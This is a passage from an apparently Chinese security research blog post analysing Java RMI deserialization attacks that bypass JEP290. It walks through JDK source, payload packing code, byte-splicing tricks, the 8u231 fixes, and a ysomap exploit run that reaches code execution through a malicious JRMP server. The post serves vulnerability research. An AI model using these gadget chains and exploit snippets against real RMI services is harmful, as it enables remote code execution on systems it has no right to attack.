<li>我们默认理解为序列化过程是对于我们的恶意object进行writeobject，<code>RMIConnectionImpl_Stub.writeobject()</code>、<code>UnicastRemoteObject.writeobject()</code>那么当然是序列化的。（实际上也可以，在github的Bypass290代码中尝试序列化写入了文件中进行查看，结果也是把正确的ref值写入了，就不贴图了）</li>
<li>但是实际上客户端序列化的过程为：ObjectOutput.writeobject(我们的恶意object)</li>
</ul>
<p>那么实际上这边的序列化逻辑与我们想象的有点出入，<strong>他会去替换掉我们辛辛苦苦生成的object</strong>。这是导致同是继承RemoteObject有的行，有的不行的关键。</p>
<p>我们在<code>java.io.ObjectOutputStream#writeObject0</code>打入断点，使用UnicastRemoteObject对象来攻击，细看：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private void writeObject0(Object obj, boolean unshared)</span><br><span class="line">        throws IOException</span><br><span class="line">    &#123;</span><br><span class="line">        boolean oldMode = bout.setBlockDataMode(false);</span><br><span class="line">        depth++;</span><br><span class="line">        try &#123;</span><br><span class="line">            //一大堆类型检查，都不会通过</span><br><span class="line"></span><br><span class="line">            // 想要去检查替换我们的object</span><br><span class="line">            Object orig = obj;</span><br><span class="line">            Class&lt;?&gt; cl = obj.getClass();</span><br><span class="line">            ObjectStreamClass desc;</span><br><span class="line">            for (;;) &#123;</span><br><span class="line">                //查找相关内容</span><br><span class="line">            &#125;</span><br><span class="line">            if (enableReplace) &#123;//都是true</span><br><span class="line">            //!!!!!!!!!!!此处替换了我们的对象！！！！！！！！！！</span><br><span class="line">                Object rep = replaceObject(obj);</span><br><span class="line">                if (rep != obj &amp;&amp; rep != null) &#123;</span><br><span class="line">                    cl = rep.getClass();</span><br><span class="line">                    desc = ObjectStreamClass.lookup(cl, true);</span><br><span class="line">                &#125;</span><br><span class="line">                obj = rep;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            //一些替换后的处理，不太重要</span><br><span class="line"></span><br><span class="line">            // 通过类进行分配序列化过程</span><br><span class="line">            if (obj instanceof String) &#123;</span><br><span class="line">                writeString((String) obj, unshared);</span><br><span class="line">            &#125; else if (cl.isArray()) &#123;</span><br><span class="line">                writeArray(obj, desc, unshared);</span><br><span class="line">            &#125; else if (obj instanceof Enum) &#123;</span><br><span class="line">                writeEnum((Enum&lt;?&gt;) obj, desc, unshared);</span><br><span class="line">            &#125; else if (obj instanceof Serializable) &#123;</span><br><span class="line">                //进入此处再开始正常的序列化</span><br><span class="line">                writeOrdinaryObject(obj, desc, unshared);</span><br><span class="line">            //...省略...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>replaceobject替换的方法具体在<code>sun.rmi.server.MarshalOutputStream#replaceObject</code>中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//var1就是我们想要序列化的类</span><br><span class="line">protected final Object replaceObject(Object var1) throws IOException &#123;</span><br><span class="line">    //这个类要是Remote接口的，并且不是RemoteStub接口的，为true</span><br><span class="line">    if (var1 instanceof Remote &amp;&amp; !(var1 instanceof RemoteStub)) &#123;</span><br><span class="line">        //这里会去获取到新的对象来替换</span><br><span class="line">        //UnicastRemoteObject走的就是这条路</span><br><span class="line">        Target var2 = ObjectTable.getTarget((Remote)var1);</span><br><span class="line">        if (var2 != null) &#123;</span><br><span class="line">            return var2.getStub();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //RMIConnectionImpl_Stub走的就是这条路</span><br><span class="line">    return var1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那么就很明显了，之前我们觉得只要是remote接口就行了，这个定义有问题，实际上要满足以下两个条件的类我们才能用：</p>
<ol>
<li>是Remote接口</li>
<li>并且是RemoteStub接口</li>
</ol>
<p>所以RMIConnectionImple_Stub可以，但是UnicastRemoteObject不行的原因。</p>
<h6 id="新的小问题-RemoteObjectInvocationHandler为啥又可以了"><a href="#新的小问题-RemoteObjectInvocationHandler为啥又可以了" class="headerlink" title="新的小问题-RemoteObjectInvocationHandler为啥又可以了"></a>新的小问题-RemoteObjectInvocationHandler为啥又可以了</h6><p>但是我们又会发现一开始就成功的RemoteObjectInvocationHandler并不满足我们的出来的规定，它是Remote接口但是不是RemoteStub接口呀。<br><img src="/images/20230430151950.png"><br>发现虽然它不满足条件进入了if，但是获取到的替换类var2为空，又返回原本的值了。</p>
<p>至于为什么会获取到的结果var2为空，是因为在getTarget中会去内部查询，查不到，就会返回空</p>
<pre><code>public static Target getTarget(Remote impl) &#123;
    synchronized (tableLock) &#123;
        return implTable.get(new WeakRef(impl));
    &#125;
&#125;
</code></pre>
<p>在分析中我们发现<strong>ObjectOutputStream对象流</strong>中的<strong>enableReplace</strong>全局变量决定了我们的对象是否会被替换：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class ObjectOutputStream</span><br><span class="line">    extends OutputStream implements ObjectOutput, ObjectStreamConstants</span><br><span class="line">&#123;</span><br><span class="line">    /** if true, invoke replaceObject() */</span><br><span class="line">    private boolean enableReplace;</span><br><span class="line"></span><br><span class="line">    private void writeObject0(Object obj, boolean unshared)</span><br><span class="line">        throws IOException</span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">        if (enableReplace) &#123;//都是true</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">     &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那么其实我们只要用反射机制，在序列化前把out对象的<strong>enableReplace属性修改为false</strong>就可以了(这需要重新实现bind查询，来进行修改)。大概如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.io.ObjectOutput out = call.getOutputStream();</span><br><span class="line">//反射修改enableReplace</span><br><span class="line">ReflectionHelper.setFieldValue(out, &quot;enableReplace&quot;, false);</span><br><span class="line">out.writeObject(obj); // 写入我们的对象</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="4-带UnicastRef类型参数的实现Remote接口的类—自定义"><a href="#4-带UnicastRef类型参数的实现Remote接口的类—自定义" class="headerlink" title="4.带UnicastRef类型参数的实现Remote接口的类—自定义"></a>4.带UnicastRef类型参数的实现Remote接口的类—自定义</h5><p>但是如果我们回忆之前的出的结论：</p>
<blockquote>
<p>反序列化打服务端，可以使用一个服务端不存在的类。在这个服务端不存在的类的变量中放入payload，这个payload会在服务端反序列化这个不存在的类的时候触发，虽然会报错，但是会触发。</p>
</blockquote>
<p>我们实际上之前做的所有的研究都是无用功，因为我们压根不用去找一个存在于JDK中的类去满足条件来进行攻击，而是自己写一个就可以了。</p>
<p>实现一个可以序列化的remote接口的类，然后正常攻击</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static class lala_remote implements Remote, java.io.Serializable &#123;</span><br><span class="line">        private RemoteRef ref;</span><br><span class="line"></span><br><span class="line">        public lala_remote(UnicastRef remoteref) throws Throwable &#123;</span><br><span class="line">            ref=remoteref;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>可以注意到不是RemoteStub接口，自实现的类会满足上卖弄整理的第三种情况，不会被替换对象。</p>
</blockquote>
<h4 id="bind的局限性"><a href="#bind的局限性" class="headerlink" title="bind的局限性"></a>bind的局限性</h4><p>好的，重新整理心情。来讨论随便的bind的局限性。</p>
<p>当我们在本地进行试验的时候，使用高于8u141的版本也是可以命令执行的。这会形成一种不受版本限制的错觉。</p>
<p>但实际上在远程攻击的时候，这种攻击是有局限性的。</p>
<blockquote>
<p>bind操作中注册端对于服务端的地址验证。</p>
</blockquote>
<h3 id="与RMI客户端反序列化攻击RMI服务端-Lookup结合"><a href="#与RMI客户端反序列化攻击RMI服务端-Lookup结合" class="headerlink" title="与RMI客户端反序列化攻击RMI服务端-Lookup结合"></a>与RMI客户端反序列化攻击RMI服务端-Lookup结合</h3><p>使用拦截器来替换攻击包的字节码，来自己重构一个攻击包的字节码。这个思路非常底层和繁琐，但是理论上可以绕过所有客户端限制逻辑。</p>
<h4 id="基于Barmie拦截器的自实现"><a href="#基于Barmie拦截器的自实现" class="headerlink" title="基于Barmie拦截器的自实现"></a>基于Barmie拦截器的自实现</h4><p>在Barmie的原逻辑中，拦截器中字节码的拼接非常简单粗暴，他会保留一些包头固定格式，然后修改参数。通常都是直接复制成功的poc的16进制字节码，然后修改其中命令执行的16进制代码，再拼接进入数据包进行发送。比如CC的payload是这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private final String _header_chunk = &quot;737200116a6176612e757469....&quot;;//开头的序列化信息</span><br><span class="line">private final String _footer_chunk = &quot;740004657865637571007e00....&quot;;//结尾的序列化信息</span><br><span class="line"></span><br><span class="line">//开头塞进去</span><br><span class="line">out.write(this.fixReferences(this.hexStrToByteArray(this._header_chunk), refCorrection));</span><br><span class="line"></span><br><span class="line">//自定义添加要执行的String形式的命令</span><br><span class="line">out.write(this.stringToUtf8ByteArray(cmd));</span><br><span class="line"></span><br><span class="line">//结尾塞进去</span><br><span class="line">out.write(this.fixReferences(this.hexStrToByteArray(this._footer_chunk), refCorrection));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们的Remote接口的对象原本也可以按照这个思路，找一个成功的数据包，然后修改其中的JRMP服务器回连IP和端口就行了。</p>
<p>但是对比JRMP服务器地址：888.888.888.888:8887、888.888.888.888:8888两次攻击数据包发现：</p>
<p>JRMP服务器回连IP可以简单进行修改，但是端口却是不可以显性直接进行修改的。</p>
<p>直接序列化不能正常利用攻击，与攻击成功数据包对比发现需要修正000078-&gt;00007078。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//使用RMIConnectionImpl_Stub类</span><br><span class="line">RMIConnectionImpl_Stub RMIConnectionImpl_Stub_obj = new RMIConnectionImpl_Stub(ref);</span><br><span class="line">//序列化，同时修正000078-&gt;00007078</span><br><span class="line">byte[] serial_Primary=serialize(RMIConnectionImpl_Stub_obj);</span><br><span class="line">//除去aced开头（序列化开头）</span><br><span class="line">byte[] serial_byte= new byte[serial_Primary.length-4];</span><br><span class="line">System.arraycopy(serial_Primary, 4, serial_byte, 0, serial_byte.length);</span><br><span class="line">//填入传输流</span><br><span class="line">out.write(this.fixReferences(serial_byte));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="重实现lookup逻辑"><a href="#重实现lookup逻辑" class="headerlink" title="重实现lookup逻辑"></a>重实现lookup逻辑</h4><p>参考<a href="https://github.com/wh1t3p1g/ysomap">ysomap</a></p>
<p>实现的方法：做了上层lookup函数的重写，这样子就实现起来就很简单简洁，且不用考虑底层字节的各种情况。</p>
<p><code>ysomap.core.exploit.rmi.component.Naming#lookup</code>直接把原来的接口<code>lookup(String)</code>调成<code>lookup(Object)</code>（实现不是如此，逻辑是如此，数据包封装的逻辑实际上直接照搬过来就可以了）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//多加了个registry参数，然后自己实现部分固定值的获取</span><br><span class="line">public static Remote lookup(Registry registry, Object obj)</span><br><span class="line">            throws Exception &#123;</span><br><span class="line">        RemoteRef ref = (RemoteRef) ReflectionHelper.getFieldValue(registry, &quot;ref&quot;);</span><br><span class="line">        long interfaceHash = (long) ReflectionHelper.getFieldValue(registry, &quot;interfaceHash&quot;);</span><br><span class="line">        java.rmi.server.Operation[] operations = (Operation[]) ReflectionHelper.getFieldValue(registry, &quot;operations&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">        ....//之后就跟原来的lookup一样了</span><br><span class="line">            //同时这里我还加入了绕过enableReplace，使UnicastRemoteObject可用</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="8u231的修复"><a href="#8u231的修复" class="headerlink" title="8u231的修复"></a>8u231的修复</h3><p>对比JDK做了两处修复：</p>
<ol>
<li><code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>报错情况消除ref</li>
<li><code>sun.rmi.transport.DGCImpl_Stub#dirty</code>提前了黑名单</li>
</ol>
<h4 id="第一处修复"><a href="#第一处修复" class="headerlink" title="第一处修复"></a>第一处修复</h4><blockquote>
<p>在openjdk中可以在线查看对比<a href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/69c4f673b33e/src/share/classes/sun/rmi/registry/RegistryImpl_Skel.java">8u232u8的RegistryImpl_Skel.java</a>与<a href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/5456f24496f4/src/share/classes/sun/rmi/registry/RegistryImpl_Skel.java">8u232u9的RegistryImpl_Skel.java</a></p>
</blockquote>
<p>其实只有一行的区别，在每个动作比如lookup，bind等中都添加了一个逻辑：**如果出现了序列化报错都会进入catch，执行<code>discardPedingRefs</code>**。</p>
<p>在<code>sun.rmi.transport.StreamRemoteCall#discardPendingRefs</code>中其实也就是做了一件事情，把我们之前装载的<code>incomingRefTable</code>清空</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void discardPendingRefs() &#123;</span><br><span class="line">    this.in.discardRefs();//去下面</span><br><span class="line">&#125;</span><br><span class="line">//sun.rmi.transport.ConnectionInputStream#discardRefs</span><br><span class="line">void discardRefs() &#123;</span><br><span class="line">    this.incomingRefTable.clear();//消除incomingRefTable里面我们的ref</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那么很清楚假如我们的payload在序列化中发生了报错，那么我们想尽办法装载的ref就会被干掉。再回头看看我们的那么多种payload都会报错么？</p>
<ol>
<li><p><strong>自定义类（动态代理或接口）</strong>：报错ClassNotFoundException</p>
<p>因为我们传入的类虽然会完成装载，但是在后续的序列化逻辑中肯定是会因为找不到我们的恶意类而发生ClassNotFoundException报错的。</p>
<p>被干掉了。</p>
</li>
<li><p><strong>动态代理转换接口或者找内置接口</strong>：报错ClassCastException</p>
<p>而其他的payload虽然因为都是有内置类的，这些内置类在序列化的时候<code>var9.readObject();</code>是没问题的。</p>
<p>但是这里还有一个类型转换的逻辑<code>var8 = (String)var9.readObject();</code>在类型转换的时候就会发生报错。</p>
<p>从而也被干掉了。</p>
</li>
</ol>
<h4 id="第二处修复"><a href="#第二处修复" class="headerlink" title="第二处修复"></a>第二处修复</h4><p>实际上第一处修复已经完美修复了，但是还有第二处修复针对的是ref被触发的时候，即<code>var7.releaseInputStream();</code></p>
<p>回顾<code>UnicastRef对象</code>这一小节，重新看我们POC触发的调用栈图的左下角，它必定会经过<code>sun.rmi.transport.DGCImpl_Stub#dirty</code></p>
<blockquote>
<p>在openjdk中可以在线查看对比<a href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/69c4f673b33e/src/share/classes/sun/rmi/transport/DGCImpl_Stub.java">8u232u8的DGCImpl_Stub.java</a>与<a href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/5456f24496f4/src/share/classes/sun/rmi/transport/DGCImpl_Stub.java">8u232u9的DGCImpl_Stub.java</a></p>
</blockquote>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200622152129-fd728322-b458-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200622152129-fd728322-b458-1.png"></a></p>
<p>在dirty方法中三个关键语句：</p>
<ol>
<li><code>this.ref.newCall</code>：发起JRMP请求</li>
<li><code>var6.setObjectInputFilter(DGCImpl_Stub::leaseFilter);</code>：过滤</li>
<li><code>this.ref.invoke()</code>：触发JRMP返回payload反序列化解析</li>
</ol>
<p>把过滤器放在解析之前，那么JRMP请求是可以发起的，但是你最后命令执行的payload（比如CC）会被过滤器给干掉。</p>
<p>看下过滤器<code>sun.rmi.transport.DGCImpl_Stub#leaseFilter</code>：一样对长度、深度、黑名单做了限制</p>
<p>我们的payload用的是CC链，不在白名单范围内，于是GG。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (var1.isPrimitive()) &#123;</span><br><span class="line">    return Status.ALLOWED;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    return var1 != UID.class &amp;&amp; var1 != VMID.class &amp;&amp; var1 != Lease.class &amp;&amp; (var1.getPackage() == null || !Throwable.class.isAssignableFrom(var1) || !&quot;java.lang&quot;.equals(var1.getPackage().getName()) &amp;&amp; !&quot;java.rmi&quot;.equals(var1.getPackage().getName())) &amp;&amp; var1 != StackTraceElement.class &amp;&amp; var1 != ArrayList.class &amp;&amp; var1 != Object.class &amp;&amp; !var1.getName().equals(&quot;java.util.Collections$UnmodifiableList&quot;) &amp;&amp; !var1.getName().equals(&quot;java.util.Collections$UnmodifiableCollection&quot;) &amp;&amp; !var1.getName().equals(&quot;java.util.Collections$UnmodifiableRandomAccessList&quot;) &amp;&amp; !var1.getName().equals(&quot;java.util.Collections$EmptyList&quot;) ? Status.REJECTED : Status.ALLOWED;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="来自An-Trinh的另一种绕过JEP290的思路"><a href="#来自An-Trinh的另一种绕过JEP290的思路" class="headerlink" title="来自An Trinh的另一种绕过JEP290的思路"></a>来自An Trinh的另一种绕过JEP290的思路</h2><p><strong>攻击者发送payload让RMI注册端发起一个JRMP请求去链接我们的JRMP服务器，然后接受并反序列化我们JRMP服务器返回的报错信息，反序列化的时候通过RMI注册端内部的利用链（比如CC）完成命令执行</strong></p>
<p>An Trinh的绕过思路还是这个套路，JRMP的部分一模一样没有改变，与我们之前不同的是<strong>如何让RMI注册端发起JRMP请求这一部分</strong>。</p>
<p>之前我们提出许多许多攻击方式：绕过客户端-自实现协议去封装、动态代理、UnicastRef类型参数实现Remote接口的类等等、甚至可以自定义一个符合要求的类来攻击。</p>
<p>但是回归到这些攻击方式，其本质都是利用：</p>
<ol>
<li><strong>readobject反序列化的过程会递归反序列化我们的对象，一直反序列化到我们的UnicastRef类。</strong></li>
<li><strong>在readobejct反序列化的过程中填装UnicastRef类到<code>incomingRefTable</code></strong></li>
<li><strong>在releaseInputStream语句中从incomingRefTable中读取ref进行开始JRMP请求</strong></li>
</ol>
<p>(后两步是发起JRMP请求的细节，在 UnicastRef对象 一节中有详细说到，可以粗糙的理解成readobject出发了JRMP查询也没事)</p>
<hr>
<p>但是An Trinh提出了一个新的思路来发起JRMP请求，不是利用<strong>readobject的递归-填装-触发</strong>的模式，而是<strong>readobject函数调用过程</strong>直接触发JRMP请求。</p>
<p>但是为什么说他鸡肋呢？因为他的payload攻击过程中：会<strong>在readobject函数中触发他的Gadgets发起JRMP连接</strong>，但是在完成后，又会回到我们的<strong>readobject的递归-填装-触发</strong>的模式中发起第二次JRMP连接。具体流程如下：</p>
<ol>
<li><strong>readobject递归反序列化到payload对象中的UnicastRef对象，填装UnicastRef对象的ref到<code>incomingRefTable</code></strong></li>
<li><strong>在根据readobject的第二个最著名的特性：会调用对象自实现的readobject方法，会执行UnicastRemoteObject的readObject，他的Gadgets会在这里触发一次JRMP请求</strong></li>
<li><strong>在releaseInputStream语句中从<code>incomingRefTable</code>中读取ref进行开始JRMP请求</strong></li>
</ol>
<p>同时他Gadgets发起JRMP请求只会发起<strong>一次请求</strong>，而readobject的递归-填装-触发的JRMP请求，由于会检测DGC是否绑定成功会<strong>循环发起JRMP</strong>，形成天然的心跳木马。</p>
<p>先给出ysomap里的封装过程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public UnicastRemoteObject pack(Object obj) throws Exception &#123;</span><br><span class="line">    //1.UnicastRef对象 -&gt; RemoteObjectInvocationHandler</span><br><span class="line">    //obj是UnicastRef对象，先RemoteObjectInvocationHandler封装</span><br><span class="line">    RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler((RemoteRef) obj);</span><br><span class="line">    //2. RemoteObjectInvocationHandler -&gt; RMIServerSocketFactory接口</span><br><span class="line">    //RemoteObjectInvocationHandler通过动态代理封装转化成RMIServerSocketFactory</span><br><span class="line">    RMIServerSocketFactory serverSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance(</span><br><span class="line">        RMIServerSocketFactory.class.getClassLoader(),// classloader</span><br><span class="line">        new Class[] &#123; RMIServerSocketFactory.class, Remote.class&#125;, // interfaces to implements</span><br><span class="line">        handler// RemoteObjectInvocationHandler</span><br><span class="line">        );</span><br><span class="line">    //通过反射机制破除构造方法的可见性性质，创建UnicastRemoteObject实例</span><br><span class="line">    Constructor&lt;?&gt; constructor = UnicastRemoteObject.class.getDeclaredConstructor(null); // 获取默认的</span><br><span class="line">    constructor.setAccessible(true);</span><br><span class="line">    UnicastRemoteObject remoteObject = (UnicastRemoteObject) constructor.newInstance(null);</span><br><span class="line">    //3. RMIServerSocketFactory -&gt; UnicastRemoteObject</span><br><span class="line">    //把RMIServerSocketFactory塞进UnicastRemoteObject实例中</span><br><span class="line">    ReflectionHelper.setFieldValue(remoteObject, &quot;ssf&quot;, serverSocketFactory);</span><br><span class="line">    return remoteObject;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>走一遍这条gadget</p>
<p>从UnicastRemoteObject的readObject入口开始<code>java.rmi.server.UnicastRemoteObject#readObject</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream in)</span><br><span class="line">        throws java.io.IOException, java.lang.ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        reexport();//这里</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>java.rmi.server.UnicastRemoteObject#reexport</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private void reexport() throws RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        if (csf == null &amp;&amp; ssf == null) &#123;</span><br><span class="line">            exportObject((Remote) this, port);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            //payload是填充了ssf的,这里</span><br><span class="line">            exportObject((Remote) this, port, csf, ssf);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>之后的调用链很长我们直接跳到<code>sun.rmi.transport.tcp.TCPEndpoint#newServerSocket</code>这里是第二个关键处动态代理的特性，跳转到拦截器的invoke（这里的动态代理是不仅用到了接口转换的特性，用到了拦截的特性！惊了！激动！）</p>
<p><code>sun.rmi.transport.tcp.TCPEndpoint#newServerSocket</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ServerSocket newServerSocket() throws IOException &#123;</span><br><span class="line">    if (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">        TCPTransport.tcpLog.log(Log.VERBOSE, &quot;creating server socket on &quot; + this);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object var1 = this.ssf;</span><br><span class="line">    if (var1 == null) &#123;</span><br><span class="line">        var1 = chooseFactory();</span><br><span class="line">    &#125;</span><br><span class="line">    //var1就是我们的payload中构建的ssf.调用他的createServerSocket</span><br><span class="line">    //会根据动态代理进入RemoteObjectInvocationHandler#invoke</span><br><span class="line">    ServerSocket var2 = ((RMIServerSocketFactory)var1).createServerSocket(this.listenPort);</span><br><span class="line">    if (this.listenPort == 0) &#123;</span><br><span class="line">        setDefaultPort(var2.getLocalPort(), this.csf, this.ssf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>java.rmi.server.RemoteObjectInvocationHandler#invoke</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public Object invoke(Object proxy, Method method, Object[] args)</span><br><span class="line">        throws Throwable</span><br><span class="line">    &#123;</span><br><span class="line">    //method是java.rmi.server.RMIServerSocketFactory的createServerSocket方法</span><br><span class="line">        //....</span><br><span class="line">        //这边都不满足</span><br><span class="line">        if (method.getDeclaringClass() == Object.class) &#123;</span><br><span class="line">            return invokeObjectMethod(proxy, method, args);</span><br><span class="line">        &#125; else if (&quot;finalize&quot;.equals(method.getName()) &amp;&amp; method.getParameterCount() == 0 &amp;&amp;</span><br><span class="line">            !allowFinalizeInvocation) &#123;</span><br><span class="line">            return null; // ignore</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            //进入此处</span><br><span class="line">            return invokeRemoteMethod(proxy, method, args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private Object invokeRemoteMethod(Object proxy,</span><br><span class="line">                                  Method method,</span><br><span class="line">                                  Object[] args)</span><br><span class="line">    throws Exception</span><br><span class="line">    &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            if (!(proxy instanceof Remote)) &#123;</span><br><span class="line">                throw new IllegalArgumentException(</span><br><span class="line">                    &quot;proxy not Remote instance&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">          //我们payload把RemoteObjectInvocationHandler的ref写成了JRMP恶意服务器地址</span><br><span class="line">          //这里开始了触发JRMP请求</span><br><span class="line">            return ref.invoke((Remote) proxy, method, args,</span><br><span class="line">                              getMethodHash(method));</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>令人激动的<code>sun.rmi.server.UnicastRef#invoke</code>我们之前JRMP触发就是在这里触发的，但是之前是<code>sun.rmi.server.UnicastRef#invoke(java.rmi.server.RemoteCall)</code>虽然接口是不一样，但是做的事情差不多</p>
<p><code>sun.rmi.server.UnicastRef#invoke(java.rmi.Remote, java.lang.reflect.Method, java.lang.Object[], long)</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public Object invoke(Remote var1, Method var2, Object[] var3, long var4) throws Exception &#123;</span><br><span class="line">        //省略部分代码...  </span><br><span class="line">        //从ref中获取连接</span><br><span class="line">        Connection var6 = this.ref.getChannel().newConnection();</span><br><span class="line">        StreamRemoteCall var7 = null;</span><br><span class="line">        boolean var8 = true;</span><br><span class="line">        boolean var9 = false;</span><br><span class="line">        Object var13;</span><br><span class="line">        try &#123;</span><br><span class="line">            if (clientRefLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">                clientRefLog.log(Log.VERBOSE, &quot;opnum = &quot; + var4);</span><br><span class="line">            &#125;</span><br><span class="line">           //********对ref发起JRMP请求**********</span><br><span class="line">            var7 = new StreamRemoteCall(var6, this.ref.getObjID(), -1, var4);</span><br><span class="line">           //处理结果</span><br><span class="line">            Object var11;</span><br><span class="line">            try &#123;</span><br><span class="line">                ObjectOutput var10 = var7.getOutputStream();</span><br><span class="line">                this.marshalCustomCallData(var10);</span><br><span class="line">                var11 = var2.getParameterTypes();</span><br><span class="line"></span><br><span class="line">                for(int var12 = 0; var12 &lt; ((Object[])var11).length; ++var12) &#123;</span><br><span class="line">                    marshalValue((Class)((Object[])var11)[var12], var3[var12], var10);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (IOException var39) &#123;</span><br><span class="line">                clientRefLog.log(Log.BRIEF, &quot;IOException marshalling arguments: &quot;, var39);</span><br><span class="line">                throw new MarshalException(&quot;error marshalling arguments&quot;, var39);</span><br><span class="line">            &#125;</span><br><span class="line">           //*******JRMP服务端返回信息，反序列化触发处*******</span><br><span class="line">            var7.executeCall();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>JRMP请求已经发起了并且返回包也收到了，接下来的报错信息饭反序列化触发点就一样了</p>
<p><code>sun.rmi.transport.StreamRemoteCall#executeCall</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void executeCall() throws Exception &#123;</span><br><span class="line">//..省略</span><br><span class="line">  switch(var1) &#123;</span><br><span class="line">        case 1:</span><br><span class="line">            return;</span><br><span class="line">        case 2:</span><br><span class="line">            Object var14;</span><br><span class="line">            try &#123;</span><br><span class="line">            //***这里触发反序列化JRMP服务端的返回的恶意对象***</span><br><span class="line">                var14 = this.in.readObject();</span><br><span class="line">            &#125; catch (Exception var10) &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>总结三个关键点：</p>
<ol>
<li>利用readobject的复写特性执行UnicastRemoteObject的readObject</li>
<li>利用动态代理的拦截执行invoke的特性，在UnicastRemoteObject#readObject的调用链中执行<code>proxy对象.createServerSocket</code>跳到了RemoteObjectInvocationHandler的invoke方法</li>
<li>RemoteObjectInvocationHandler的invoke方法可以根据内置的ref向外发起JRMP连接，再反序列化返回结果</li>
</ol>
<h3 id="复现—绕过8u231"><a href="#复现—绕过8u231" class="headerlink" title="复现—绕过8u231"></a>复现—绕过8u231</h3><p>利用ysomap的RMIConnectWithUnicastRemoteObject模块：</p>
<pre><code>RMIConnectWithUnicastRemoteObject payload = new RMIConnectWithUnicastRemoteObject();
Bullet bullet = payload.getDefaultBullet(&quot;127.0.0.1&quot;,&quot;1199&quot;);
payload.setBullet(bullet);

RMIRegistryExploit RMIexploit = new RMIRegistryExploit();
RMIexploit.target=&quot;127.0.0.1:1099&quot;;
RMIexploit.payload=payload;
RMIexploit.run();
</code></pre>
<p>我们来看看是如何做到的！同样从231u11的两处修复出发：</p>
<ol>
<li><code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>报错情况消除ref<br>看上面的触发流程，你就知道为啥绕过了。<br>这项修复针对的是<strong>readobject的递归-填装-触发模式</strong>JRMP请求发起，在readobject中利用复写的Gadagets完全不受这个ref清除操作的影响。完美！</li>
